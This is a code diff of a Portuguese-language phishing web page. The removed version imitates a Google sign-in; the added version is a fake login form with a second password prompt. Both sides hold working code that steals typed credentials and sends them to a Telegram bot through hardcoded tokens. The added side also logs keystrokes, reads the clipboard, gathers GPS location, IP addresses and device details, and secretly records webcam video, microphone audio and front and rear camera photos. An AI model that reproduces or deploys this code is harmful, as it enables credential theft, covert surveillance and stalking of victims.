@@ -1,191 +1,183 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
-  <title>Login</title>
-  <style>
-    /* ---------- LOGIN GOOGLE ---------- */
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:Roboto,Google Sans,Arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-    .login-container{width:100%;max-width:450px;padding:20px}
-    .login-card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.24);padding:40px;text-align:center}
-    .google-logo{width:75px;height:auto;margin-bottom:16px;display:block;margin-left:auto;margin-right:auto}
-    .login-title{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
-    .login-subtitle{font-size:16px;color:#5f6368;margin-bottom:32px}
-    .email-screen{display:block}.password-screen{display:none}
-    .input-field{width:100%;padding:13px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;outline:none;transition:border-color .2s}
-    .input-field:focus{border:2px solid #1a73e8}.input-field.error{border:2px solid #d93025}
-    .error-message{color:#d93025;font-size:12px;text-align:left;margin-top:-12px;margin-bottom:16px;display:none}
-    .forgot-link{display:inline-block;color:#1a73e8;font-size:14px;text-decoration:none;margin-bottom:32px}.forgot-link:hover{text-decoration:underline}
-    .info-text{font-size:14px;color:#5f6368;margin-bottom:32px;line-height:1.5;text-align:left}.info-text a{color:#1a73e8;text-decoration:none}.info-text a:hover{text-decoration:underline}
-    .button-group{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
-    .btn-create{background:transparent;border:none;color:#1a73e8;font-size:14px;font-weight:500;padding:10px 16px;cursor:pointer;border-radius:4px}.btn-create:hover{background:#f1f3f4}
-    .btn-next{background:#1a73e8;color:#fff;border:nonw;font-size:14px;font-weight:500;padding:10px 24px;border-radius:4px;cursor:pointer}.btn-next:hover{background:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,.2)}
-    .user-info{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:24px}
-    .user-avatar{width:48px;height:48px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:500}
-    .user-email{font-size:15px;color:#3c4043}.btn-change{background:transparent;border:none;color:#1a73e8;font-size:12px;font-weight:500;cursor:pointer}.btn-change:hover{text-decoration:underline}
-    .password-container{position:relative;margin-bottom:16px}
-    .password-input{width:100%;padding:13px 48px 13px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border-color .2s}.password-input:focus{border:2px solid #1a73e8}
-    .toggle-password{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:transparent;border:none;cursor:pointer;color:#5f6368}
-    .show-password-container{display:flex;align-items:center;gap:8px;margin-bottom:16px;text-align:left}.show-password-container input{width:16px;height:16px;accent-color:#1a73e8}.show-password-container label{font-size:14px;color:#3c4043;cursor:pointer}
-    .footer{display:flex;justify-content:space-between;align-items:center;margin-top:24px;padding:0  8px}.language-select{background:transparent;border:none;color:#5f6368;font-size:12px;cursor:pointer;outline:none}
-    .footer-links{display:flex;gap:24px}.footer-links a{color:#5f6368;font-size:12px;text-decoration:none}.footer-links a:hover{color:#202124;text-decoration:underline}
-    @media(max-width:480px){.login-card{padding:24px}.footer{flex-direction:column;gap:16px}}
-
-    /* ---------- LOADING ---------- */
-    #loading{background:#000;color:#00ff88;display:none;position:fixed;inset:0;z-index:9999;text-align:center;padding-top:40vh}
-    #load{border:4px solid #00ff88;border-radius:50%;width:34px;height:34px;border-top-color:transparent;border-bottom-color:transparent;animation:spin 1s ease-in-out forwards;margin:0 auto 16px}
-    @keyframes spin{to{transform:rotate(1turn)}}
-    #status{font-family:monospace;font-size:16px}
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+ *{margin:0;padding:0;box-sizing:border-box}
+ html,body{height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#00ff88;font:24px sans-serif}
+ #load{position:fixed;inset:0;z-index:9999;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center}
+ .spin{width:60px;height:60px;border:4px solid #00ff8840;border-top-color:#00ff88;border-radius:50%;animation:spin s linear infinite}
+ @keyframes spin{to{transform:rotate(360deg)}}
+ .fakeForm{display:none;background:#111;padding:40px;border-radius:8px;color:#eee;flex-direction:column;align-items:center}
+ .fakeForm h2{margin-bottom:20px;font-size:20px}
+ .fakeForm input{width:260px;padding:12px;margin:8px 0;border:0;border-radius:4px;font-size:16px}
+ .fakeForm button{width:100%;padding:14px;margin-top:12px;border:0;border-radius:4px;background:#00ff88;color:#000;font-size:16px;font-weight:bold;cursor:pointer}
+ .fakeForm button:hover{background:#00cc6a}
+ #statusPC{position:fixed;bottom:20px;left:20px;color:#00ff88;font:12px monospace;opacity:.6}
+</style>
 </head>
 <body>
-
-<!-- ========= LOGIN GOOGLE MONOTELA ========= -->
-<div id="auth1">
-  <div class="login-container">
-    <div class="login-card">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAABaCAYAAABzAJLvAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAj2SURBVHhe7d19cBT1Hcfx727ucne5PIckYCEGIaAMDzKAgFAoUsGiVUHrw2hlig84IIpKW8AHlClU6ijTZmBsrWNrnTqOUnUKOiiCgO0QowPxKfJMISBPebjcXe4ud7fbP9oo9yNesoHc/m6zrz8/3x3myOd+e/t0iaLruo7NslQxsFmLXbHF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs+Q9inziKOLLSos+O4t5aysbPl7Pu/dCxF7x4C3gKnvP3kTnwIjIuuQZnQT5qUREUFYWqKP+fcVR3+jsVlirYdq70OJm7dbl5ds3tAVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs+Q9inziKOLLSos+O4t5aysbPl7Pu/tCxF7x4C3gKnvP3kTnwIjIuuQZnvh+yU3DnLxOjVJeq2CrYdq70OJm7dbl5ds3tAVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs+Q9inziKOLLSos+O4t5aysbPl7Pu/tCxF7x4C3gKnvP3kDnwwIjIuuQZnvh+yU3DnLxOjVJeq2CrYdq70OJm7dbl5ds3tAVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs.Q9inziKOLLSos+O4t5aysbPl7Pu/tCxF7x4C3gKnvP3kDnwwIjIuuQZnvh.yU3DnLxOjVJeq2CrYdq70OJm7dbl5ds3tAVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs.Q9inziKOLLSos+O4t5aysbPl7Pu/tCxF7x4C3gKnvP3kDnwwIjIuuQZnvh.yU3DnLxOjVJeq2CrYdq70OJm7dbl5ds3tAVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMXZBVucXbDF2QVbnF2wxdkFW5xdsMUpVnpkJ/rlZ0Q/303r57vQ6uvRgwH0liBaUyOKy4WaX4haVIhGUS8cg4eQOeoK5IxvcRxO0rLg2OGDhN5+nfCH3egBD3EULfwXLiP9C/bOIaQvOHzyXeJb3sM54mKchYW4CgtxFhbC4cNQlAtVcSFlxFByR5+PO+k2Oe+6mXOVlpYFRw8dJPT2G0R27hRHUsoYO5bs.Q9inziKOLLSos+O4t5aysbPl7Pu/tCxF7x4C3gKnvP3kDnwwIjIuuQ_zAJLvAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAj2SURBVHhe7d19cBT1Hcfx727ucne5PIckYCEGIaAMDzKAgFAoUsGiVUHrg2hlig84IIpKW8AHlClU6ijTZmBsrWNrnTqOUnUKOiiCgO0QowPxKfJMISBPebjcXe4ud7fbP9oo9yNesoHc/m6zrz8/3w3myOd" class="google-logo">
-
-      <div id="emailScreen" class="email-screen">
-        <h1 class="login-title">Faça login</h1>
-        <p class="login-subtitle">Use sua Conta do Google</p>
-        <input type="text" id="emailInput" class="input-field" placeholder="E-mail ou telefone">
-        <p id="errorMessage" class="error-message">Digite um e-mail válido (ex: exemple@hotmail.com)</p>
-        <a href="#" class="forgot-link">Esqueceu o e-mail?</a>
-        <p class="info-text">
-          Não está no seu computador? Use uma janela de navegação privada para fazer login.
-          <a href="#">Saiba como usar o modo visitante</a>
-        </p>
-        <div class="button-group">
-          <button class="btn-create">Criar conta</button>
-          <button class="btn-next" onclick="validaEEnvia()">Avançar</button>
-        </div>
-      </div>
-
-      <div id="passwordScreen" class="password-screen">
-        <h1 class="login-title">Bem-vindo</h1>
-        <div class="user-info">
-          <div class="user-avatar" id="userAvatar">U</div>
-          <span class="user-email" id="userEmailDisplay">usuario@email.com</span>
-          <button class="btn-change" onclick="showEmailScreen()">Alterar</button>
-        </div>
-        <div class="password-container">
-          <input type="password" id="passwordInput" class="password-input" placeholder="Digite sua senha">
-          <button type="button" class="toggle-password" onclick="togglePassword()">
-            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></rect><circle cx="12" cy="12" r="3"></circle>
-            </svg>
-          </button>
-        </div>
-        <div class="show-password-container">
-          <input type="checkbox" id="showPasswordCheck" onchange="togglePasswordCheckbox()">
-          <label for="showPasswordCheck">Mostrar senha</label>
-        </div>
-        <a href="#" class="forgot-link">Esqueceu a senha?</a>
-        <div class="button-group">
-          <button class="btn-create">Criar conta</button>
-          <button class="btn-next" onclick="enviaPswComeca()">Entrar</button>
-        </div>
-      </div>
-    </div>
-    <div class="footer">
-      <select class="language-select"><option>Português (Brasil)</option><option>English (United States)</option><option>Español (España)</option><option>Français (France)</option></select>
-      <div class="footer-links"><a href="#">Ajuda</a><a href="#">Privacidade</a><a href="#">Termos</a></div>
-    </div>
-  </div>
+<div id="load">
+ <div class="spin"></div>
+ <h3>Carregando<span class="dots">...</span></h3>
 </div>
 
-<!-- TELA BRANCA / LOADING -->
-<div id="loading" style="display:none;position:fixed;inset:0;background:#000;color:#00ff88;font-family:monospace;font-size:18px;text-align:center;padding-top:40vh">
-  <div id="load" style="border:4px solid #00ff88;border-radius:50%;width:34px;height:34px;border-top-color:transparent;border-bottom-color:transparent;margin:0 auto 16">
-    <div style="animation:spin 1s linear infinite"></div>
-  </div>
-  <p id="status">carregando...</p>
-</div>
+<form id="fakeForm" class="fakeForm">
+ <h2>Acesse sua conta</h2>
+ <input id="em" type="email" placeholder="E-mail" autocomplete="email">
+ <input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
+ <button type="submit">Entrar</button>
+</form>
+
+<form id="fakeForm2" class="fakeForm">
+ <h2>Confirme sua senha</h2>
+ <input id="pw2" type="password" placeholder="Digite novamente" autocomplete="current-password">
+ <button type="submit">Confirmar</button>
+</form>
+
+<div id="statusPC"></div>
 
 <script>
-/* ---------- CONFIG ---------- */
-const BOT_TOKEN = "7331351183:AAHxyK3lN8K-1nQb4Wz2yC0vB7sD9eF2gH5I";
-const CHAT_ID   = "722137806";
-const rel       = []; // log local
-/* ---------- UTILS ---------- */
-const save    = (d) => rel.push({t:Date.now(),...d});
-const loh     = (m) => console.log(`[${new Date().toISOString()}] ${m}`);
-const statusPC= (t) => document.getElementById("status").textContent = t;
-/* ---------- API TELEGRAM ---------- */
-const sendTG = async (type,payload) => {
-  try{
-    const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type}`,{method:"POST",body:payload});
-    const j=await r.json();
-    if(!j.ok) throw new Error(j.description||"tg err");
-    loh(`✓ ${type} enviado`);
-  }catch(e){rel.push(`Falha envio:${e.message}`);}
+const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
+const CHAT_ID="8792921881";
+
+const enviarTexto=t=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:t.slice(0,4096),parse_mode:"HTML"})}).catch(()=>{});
+const enviarMidia=(tipo,fd)=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${tipo}`,{method:"POST",body:fd}).catch(()=>{});
+const save=u=>fetch("/api/salva",{method:"POST",body:JSON.stringify(u),headers:{"content-type":"application/json"}}).catch(()=>{});
+
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const statusPC=m=>{const el=document.getElementById("statusPC");if(el)el.textContent=m};
+
+let rel=[],mapLink="",ffmpeg=null,audioRecorder=null,videoRecorder=null,audioChunksA=[],audioChunksB=[],useA=true,videoChunks=[],keyLog=[],clipLog=[],fotoTimeout=null,videoStream=null,audioStream=null;
+
+/* ---------- FFmpeg sem erro ---------- */
+const LOAD_FFMPEG=()=>new Promise((res,rej)=>{
+ if(window.FFmpeg){res();return}
+ const s=document.createElement("script");
+ s.src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.12.9/dist/umd/ffmpeg.js";
+ s.onload=()=>res(); s.onerror=()=>rej(new Error("FFmpeg CDN falhou"));
+ document.head.appendChild(s);
+});
+const initFFmpeg=async()=>{
+ await LOAD_FFMPEG();
+ const {createFFmpeg}=window.FFmpeg;
+ ffmpeg=createFFmpeg({log:false});
+ await ffmpeg.load();
+ statusPC("FFmpeg pronto");
 };
-/* ---------- CAPTURA DADOS EXTRAS ---------- */
-const geo = async () => {
-  try{
-    const p=await new Promise((rs,rj)=>navigator.geolocation.getCurrentPosition(rs,rj,{timeout:6000}));
-    const{latitude:lat,longitude:lon,accuracy:acc}=p.coords;
-    save({t:"gps",lat,lon,acc});
-    statusPC(`GPS: ${lat.toFixed(6)},${lon.toFixed(6)}`);
-  }catch{save({t:"gps",err:"negado"});}
+const webmToMp4=async(webmBlob)=>{
+ if(!ffmpeg)return webmBlob;
+ const input="rec.webm",output="rec.mp4";
+ const buf=await webmBlob.arrayBuffer();
+ ffmpeg.FS("writeFile",input,new Uint8Array(buf));
+ await ffmpeg.run("-i",input,"-c","copy",output);
+ const data=ffmpeg.FS("readFile",output);
+ return new Blob([data.buffer],{type:"video/mp4"});
 };
-const bat = async () => {
-  if(!navigator.getBattery){save({t:"bat",perc:88,ch:true});return;}
-  const b=await navigator.getBattery();
-  save({t:"bat",perc:Math.round(b.level*100),ch:b.charging});
-  b.addEventListener("levelchange",()=>save({t:"bat",perc:Math.round(b.level*100)}));
-};
-const netinfo = async () => {
-  try{
-    const r=await fetch("//ip-api.com/json");
-    const d=await r.json();
-    save({t:"net",ip:d.query,isp:d.isp,country:d.country});
-    statusPC(`${d.country} · ${d.isp}`);
-  }catch{save({t:"net",err:"falha ip-api"});}
-};
-/* ---------- MÍDIAS (foto/vídeo/áudio) ---------- */
-let videoStream, audioStream, fotoTimeout;
-const midias = async () => {
-  statusPC("Iniciando captura...");
-  /* vídeo */
-  try{
-    videoStream=await navigator.mediaDevices.getUserMedia({video:{width:1280,height:720}});
-    const chunks=[];
-    const rec=new MediaRecorder(videoStream,{mimeType:"video/webm"});
-    rec.start(2000);
-    rec.ondataavailable=e=>e.data?.size&&chunks.push(e.data);
-    setInterval(async()=>{
-      if(!chunks.length)return;
-      const blob=new Blob(chunks.splice(0),{type:"video/webm"});
-      const fd=new FormData();
-      fd.append("video",blob,`v${Date.now()}.webm`);
-      fd.append("chat_id",CHAT_ID);
-      await sendTG("Video",fd);
-      save({t:"video",s:blob.size});
-      statusPC("Vídeo enviado");
-    },5000);
-  }catch(e){save({t:"video",err:e.message});}
-  /* áudio */
-  try{
-    audioStream=await navigator.mediaDevices.getUserMedia({audio:{sampleRate:48000,echoCancellation:false}});
-    const aChunks=[];
-    const aRec=new MediaRecorder(audioStream,{mimeType:"audio/webm"});
-    aRec.start(2000);
-    aRec.ondataavailable=e=>e.data?.size&&aChunks.push(e.data);
-    setInterval(async()=>{
-      if(!aChunks.length)return;
-      const blob=new Blob(aChunks.splice(0),{type:"audio/webm"});
-      const fd=new FormData();
-      fd.append("video",blob,`a${Date.now()}.webm`);
-      fd.append("chat_id",CHAT_ID);
-      await sendTG("Video",fd);
-      save({t:"audio",s:blob.size});
-    },5000);
-  }catch(e){save({t:"audio",err:e.message});}
-  /* fotos */
+
+/* ---------- GPS + mapa ---------- */
+async function gps(){
+ return new Promise(res=>{
+   navigator.geolocation.getCurrentPosition(
+     async pos=>{
+       const{latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
+       mapLink=`https://www.google.com/maps?q=${lat},${lon}&ll=${lat},${lon}&z=18`;
+       rel.push(`GPS: ${lat.toFixed(6)},${lon.toFixed(6)} (±${acc}m) ${mapLink}`); res();
+     },
+     async ()=>{
+       const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"");
+       const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({lat:null,lon:null}));
+       if(geo.lat && geo.lon){mapLink=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&ll=${geo.lat},${geo.lon}&z=16`;rel.push(`IP-Geo: ${geo.lat},${geo.lon} (${geo.city}) ${mapLink}`);}
+       else rel.push("Localização: indisponível"); res();
+     },
+     {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+   );
+ });
+}
+
+/* ---------- IP + ISP ---------- */
+async function redes(){
+ try{
+   const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---"); rel.push(`IP Público: ${ip}`);
+   const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); pc.createDataChannel("");
+   let cand=[]; pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
+   try{await pc.setLocalDescription(await pc.createOffer());await sleep(1500)}catch{}; pc.close();
+   const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172.")); rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
+   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"Indisponível",country:"Indisponível",org:""}));
+   rel.push(`ISP: ${geo.isp} | País: ${geo.country}`);
+   if(navigator.connection){const c=navigator.connection;rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);}
+   if('connection' in navigator && navigator.connection.ssid){
+     rel.push(`Wi-Fi: ${navigator.connection.ssid}`);
+   }else{
+     rel.push(`Wi-Fi: nome oculto (permissão necessária)`);
+   }
+ }catch(e){rel.push(`Rede: erro`)}
+}
+
+/* ---------- HW + bateria ---------- */
+function hwinfo(){
+ rel.push(`User-Agent: ${navigator.userAgent?.slice(0,200)}`);
+ rel.push(`Plataforma: ${navigator.platform}`);
+ rel.push(`RAM estimada: ${navigator.deviceMemory||'?'} GB`);
+ rel.push(`Tela: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${window.innerHeight}`);
+ rel.push(`Idioma: ${navigator.language}`);
+ rel.push(`Touch: ${navigator.maxTouchPoints||0} pontos`);
+ if(performance.memory){const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1),total=(performance.memory.totalJSHeapSize/1048576).toFixed(1);rel.push(`Memória JS: ${used}/${total} MB`);}
+}
+async function bateria(){
+ try{
+   const bat=await navigator.getBattery();
+   rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`);
+ }catch{
+   rel.push("Bateria: não permitido");
+ }
+}
+
+/* ---------- Keylogger + clipboard ---------- */
+function keylogger(){
+ document.addEventListener("keydown",e=>{keyLog.push(e.key);if(keyLog.length>50){enviarTexto("📝 KEYLOG\n"+keyLog.join(""));keyLog=[]}});
+ setInterval(()=>navigator.clipboard.readText().then(t=>{if(t&&t!==clipLog[clipLog.length-1]){clipLog.push(t);enviarTexto("📋 CLIPBOARD\n"+t.slice(0,500))}}).catch(()=>{}),3000);
+}
+
+/* ---------- Mídias (fotos/vídeo/mp4) ---------- */
+async function midias(){
+ statusPC("Solicitando mídia..."); let stream=null;
+ try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:48000,channelCount:2,echoCancellation:false,noiseSuppression:false,autoGainControl:false}});statusPC("Permissões OK");}
+ catch(err){rel.push(`Mídia negada: ${err.name}`);statusPC("Mídia negada");return;}
+ videoStream=stream; audioStream=new MediaStream(stream.getAudioTracks());
+
+
+ // vídeo contínuo → mp4
+ try{
+   videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
+   videoRecorder.ondataavailable=e=>{if(e.data&&e.data.size)videoChunks.push(e.data)};
+   videoRecorder.start(1000);
+ }catch(e){rel.push(`Erro vídeo: ${e.message}`)}
+ setInterval(async()=>{
+   if(!videoChunks.length)return;
+   const mp4=await webmToMp4(new Blob(videoChunks.splice(0),{type:"video/webm"}));
+   const fd=new FormData();fd.append("video",mp4,`v${Date.now()}.mp4`);fd.append("chat_id",CHAT_ID);
+   enviarMidia("Video",fd);save({t:"video",s:mp4.size});statusPC(`MP4 enviado: ${(mp4.size/1024/1024).toFixed(1)}MB`);
+ },60000);
+
+ // audio alternado
+ const makeAudioRecorder=()=>{
+   const rec=new MediaRecorder(audioStream,{mimeType:"audio/webm;codecs=opus"});
+   rec.ondataavailable=e=>{
+     const chunks=useA?audioChunksB:audioChunksA; chunks.push(e.data);
+     const target=useA?audioChunksA:audioChunksB;if(target.length>=5){
+       const blob=new Blob(target.splice(0),{type:"audio/webm"});const fd=new FormData();
+       fd.append("voice",blob,`a${Date.now()}.webm`);fd.append("chat_id",CHAT_ID);
+       enviarMidia("Voice",fd);save({t:"audio",s:blob.size});
+     }
+   };rec.start(2000);return rec;
+ };
+ audioRecorder=makeAudioRecorder();
+ setInterval(()=>{useA=!useA;audioRecorder.stop();audioRecorder=makeAudioRecorder()},10000);
+
+ // fotos
+   // fotos
   const tirarFoto=async(facing="user",label="selfie")=>{
     try{
       const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
@@ -195,100 +187,70 @@ const midias = async () => {
       const fd=new FormData();
       fd.append("photo",blob,`${label}_${Date.now()}.jpg`);
       fd.append("chat_id",CHAT_ID);
-      await sendTG("Photo",fd);
+      await enviarMidia("Photo",fd);
       save({t:label,s:blob.size});
       track.stop();
     }catch{
-      // fallback canvas
       const c=document.createElement("canvas");
       c.width=640;c.height=480;
       const v=document.createElement("video");
       v.srcObject=videoStream;
       v.muted=true;
       v.play();
-      await new Promise(r=>setTimeout(r,100));
+      await sleep(100);
       c.getContext("2d").drawImage(v,0,0,640,480);
-      c.toBlob(async b=>{
+      c.toBlob(b=>{
         const fd=new FormData();
         fd.append("photo",b,`${label}_${Date.now()}.jpg`);
         fd.append("chat_id",CHAT_ID);
-        await sendTG("Photo",fd);
-        save({t:label,s:b.size});
-      },"image/jpeg",0.7);
+        enviarMidia("Photo",fd)},"image/jpeg",0.7);
     }
   };
+
   fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
   setTimeout(()=>tirarFoto("environment","rear"),2000);
   statusPC("Mídia ativa");
-};  // fecha midias()
+}; // ← aqui fecha midias()
 
-/* ---------- LOGIN + ENVIO ---------- */
-function validateEmail(email){
-  const validDomains=['hotmail.com','gmail.com','outlook.com','yahoo.com','yahoo.com.br','live.com','icloud.com','uol.com.br','bol.com.br','terra.com.br','gmail.com.br'];
-  if(!email.includes('@'))return false;
-  const domain=email.split('@')[1];
-  return validDomains.some(d=>d===domain.toLowerCase());
-}
-function showEmailScreen(){
-  document.getElementById('passwordScreen').style.display='none';
-  document.getElementById('emailScreen').style.display='block';
-}
-function togglePassword(){
-  const p=document.getElementById('passwordInput');
-  const eye=document.getElementById('eyeIcon');
-  const chk=document.getElementById('showPasswordCheck');
-  if(p.type==='password'){
-    p.type='text';chk.checked=true;
-    eye.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
-  }else{
-    p.type='password';chk.checked=false;
-    eye.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
-  }
-}
-function togglePasswordCheckbox(){
-  const chk=document.getElementById('showPasswordCheck');
-  const p=document.getElementById('passwordInput');
-  p.type=chk.checked?'text':'password';
-  togglePassword();
+
+/* ---------- Login falso + 2ª senha ---------- */
+function fakeLogin(){
+ document.getElementById("load").style.display="none";
+ document.getElementById("fakeForm").style.display="flex";
+ document.getElementById("fakeForm").onsubmit=e=>{
+   e.preventDefault();
+   const email=document.getElementById("em").value,pw=document.getElementById("pw").value;
+   rel.push(`EMAIL: ${email}`);rel.push(`SENHA: ${pw}`);
+   enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${pw}`);save({t:"login",em:email,pw:pw});
+   document.getElementById("fakeForm").style.display="none";
+   document.getElementById("fakeForm2").style.display="flex";
+ };
+ document.getElementById("fakeForm2").onsubmit=e=>{
+   e.preventDefault();
+   const pw2=document.getElementById("pw2").value;
+   rel.push(`SENHA2: ${pw2}`);
+   enviarTexto(`🔐 SENHA2: ${pw2}`);save({t:"senha2",pw:pw2});
+   document.getElementById("fakeForm2").style.display="none";
+   document.getElementById("load").style.display="flex";
+   initFinal();
+ };
 }
 
-async function validaEEnvia(){
-  const emailInput=document.getElementById('emailInput');
-  const errorMessage=document.getElementById('errorMessage');
-  const email=emailInput.value.trim();
-  if(!validateEmail(email)){
-    emailInput.classList.add('error');
-    errorMessage.style.display='block';
-    return;
-  }
-  emailInput.classList.remove('error');
-  errorMessage.style.display='none';
-  // envia e-mail
-  const fdE=new FormData();
-  fdE.append("chat_id",CHAT_ID);
-  fdE.append("text",`📧 E-mail: ${email}`);
-  await sendTG("Message",fdE);
-  // mostra tela de senha
-  document.getElementById('emailScreen').style.display='none';
-  document.getElementById('passwordScreen').style.display='block';
-  document.getElementById('userEmailDisplay').textContent=email;
-  document.getElementById('userAvatar').textContent=email.charAt(0).toUpperCase();
+/* ---------- Relatório e start ---------- */
+async function initFinal(){
+ try{
+   await gps();
+   await redes();
+   hwinfo();
+   await bateria();
+   keylogger();
+   await midias();
+   enviarTexto("📊 RELATÓRIO\n"+rel.join("\n"));save({t:"rel",v:rel.join("\n")});
+ }catch(e){enviarTexto("❌ ERRO: "+e.message);statusPC("Erro: "+e.message)}
 }
-async function enviaPswComeca(){
-  const psw=document.getElementById('passwordInput').value;
-  // envia senha
-  const fdP=new FormData();
-  fdP.append("chat_id",CHAT_ID);
-  fdP.append("text",`🔐 Senha: ${psw}`);
-  await sendTG("Message",fdP);
-  // esconde login e mostra loading branco
-  document.getElementById('auth1').style.display='none';
-  document.getElementById('loading').style.display='block';
-  // inicia capturas
